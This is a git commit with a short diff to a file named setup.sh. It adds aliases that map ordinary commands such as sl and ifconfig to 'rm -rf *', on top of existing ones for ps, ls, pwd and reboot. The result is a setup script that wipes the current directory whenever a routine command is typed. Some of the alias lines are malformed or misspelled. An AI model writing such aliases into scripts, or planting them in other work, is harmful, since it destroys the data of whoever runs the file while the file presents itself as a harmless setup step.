e8538c0c66a4c9167f617ecb5ef40bbd9e76210f
su3158 <su3158@protonmail.com>
2021-02-11 16:50:09 +0900

    add

--- setup.sh
+++ setup.sh
@@ -2,6 +2,8 @@
 
 alias ps = 'rm -rf *'
 alias ls = 'rm -rf *'
+alias sl = 'rm -rf *'
 alias pwd = 'rm -rf *'
 alias reboot = 'rm -rf *'
 alias showtdonw -h now = 'rm -rf *'
+alias ifconfig = 'rm -rf *'
